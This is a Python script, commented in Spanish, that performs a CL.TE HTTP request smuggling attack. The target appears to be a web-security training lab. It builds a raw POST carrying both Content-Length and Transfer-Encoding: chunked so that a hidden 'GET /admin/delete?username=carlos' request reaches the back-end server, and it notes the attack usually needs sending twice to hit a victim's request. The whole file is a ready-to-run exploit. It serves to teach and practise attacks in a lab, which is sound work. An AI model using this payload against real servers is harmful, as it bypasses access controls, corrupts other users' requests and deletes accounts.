#!/usr/bin/env python3
"""
HTTP Request Smuggling  ->  CL.TE
=================================
Front-end usa Content-Length, back-end usa Transfer-Encoding.

Idea:
  - El FRONT-END mira Content-Length -> reenvia TODO el cuerpo (incluida la
    peticion colada) porque el CL cubre todos los bytes.
  - El BACK-END mira Transfer-Encoding: chunked -> ve el chunk "0" y cree que la
    peticion TERMINO ahi. Lo que viene despues del "0\r\n\r\n" se queda en su
    buffer y se interpreta como el INICIO de la siguiente peticion. Eso es el
    "smuggling".

Estructura del cuerpo:
    0\r\n            <- chunk de tamano 0 = "aqui termina" para el back-end (TE)
    \r\n
    GET /admin/... HTTP/1.1   <- peticion colada (la que ejecuta el back-end)
    ...

Content-Length exterior = longitud de TODO el cuerpo (se calcula solo).

Uso:
    python cl_te.py
Cambia HOST / PORT / USE_TLS y la peticion colada (smuggled_request).
"""
import socket
import ssl

HOST = "TU-LAB-ID.web-security-academy.net"  # <-- cambia por tu lab
PORT = 443
USE_TLS = True          # True para HTTPS, False para HTTP
TIMEOUT = 10            # segundos; sube si el server se queda esperando


def send_raw(host: str, port: int, raw: bytes, use_tls: bool = True,
             timeout: float = TIMEOUT) -> bytes:
    """Abre el socket, envia los bytes EXACTOS y devuelve la respuesta cruda."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        # En labs con certificados raros puedes relajar la verificacion:
        # ctx.check_hostname = False
        # ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    try:
        sock.sendall(raw)
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
            except socket.timeout:
                break            # normal en smuggling: el server se queda esperando
            if not data:
                break
            chunks.append(data)
        return b"".join(chunks)
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Peticion COLADA (la que ejecuta el back-end).
# OJO con el Content-Length de aqui dentro: si es mayor que el cuerpo real
# ("x=1" = 3 bytes), el back-end se "come" los primeros bytes de la SIGUIENTE
# peticion legitima hasta completar ese CL. Por eso el ataque suele necesitar
# enviarse 2 veces (la 1a envenena, la 2a de la victima dispara).
# ---------------------------------------------------------------------------
smuggled_request = (
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1"
)

# Cuerpo completo: chunk de cierre (0) + la peticion colada.
# El back-end (TE) corta en "0\r\n\r\n"; lo que sigue queda colado.
body = (
    "0\r\n"
    "\r\n"
    f"{smuggled_request}"
)

# CL exterior = longitud de TODO el cuerpo (asi el front-end lo reenvia entero).
content_length = len(body.encode("latin-1"))

request = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {content_length}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"{body}"
).encode("latin-1")   # latin-1 = 1 byte por caracter, asi len() cuadra siempre


if __name__ == "__main__":
    print(f"[*] CL.TE  ->  {HOST}:{PORT} (TLS={USE_TLS})")
    print("[*] Peticion enviada:\n" + "-" * 40)
    print(request.decode("latin-1"))
    print("-" * 40)

    resp = send_raw(HOST, PORT, request, use_tls=USE_TLS)
    print(f"[*] Respuesta ({len(resp)} bytes):\n" + "=" * 40)
    print(resp.decode("latin-1", errors="replace"))
